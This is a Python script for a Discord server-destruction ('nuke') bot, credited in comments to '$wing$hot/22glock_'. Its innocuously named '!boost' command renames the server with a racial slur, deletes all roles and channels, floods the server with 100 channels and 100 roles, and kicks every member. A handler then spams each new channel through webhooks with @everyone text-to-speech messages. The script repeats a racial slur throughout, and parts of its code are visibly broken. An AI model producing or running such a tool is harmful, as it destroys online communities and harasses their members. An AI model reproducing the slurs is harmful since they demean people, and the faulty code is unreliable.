from keep_alive import keep_alive
keep_alive()
# сreate by https://guns.lol/22glock_
# сreate by $wing$hot/22glock_4k
from discord.text import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

bot.remove_command("nigga")

@bot.command()
async def boost(ctx):
    guild = ctx.message.guild
  
    with open('https://guns.lol/22glock_', 'rb') as f:
        icon = f.read()
    await guild.edit(name="nigga ata to eh", icon=icon)

    await ctx.message.delete()

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="wala lang, nigga kaba?")
        except:
            pass

    for channel in ctx.guild.channels:  # chat
        try:
            await channel.delete(reason="wala lang, nigga kaba?")  # удаляем
        except:
            pass

    for _ in range(100):
        await guild.create_text_channel('crash-by-$wing$hot-luvsU-bot')

    for _ in range(100):
        await guild.create_role(name='dawg')

    for m in ctx.guild.members:
        try:
            await m.kick(reason="kaka pindot mo ng mga bold sa discord yan ungas ka eh!")
        except:
            pass


@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="nopetsallowed bot")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(
            str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        for i in range(100):
            try:
                await webhook.send(
                    "**@everyone no snitch allowed nigga's __nopetsallowed-bot__!!! view my socials https://guns.lol/22glock_ **",
                    tts=True)
            except:
                pass


token = open("token.txt").read()
bot.run(token)
# сreate by https://guns.lol/22glock_
# сreate by $wing$hot/22glock_4k
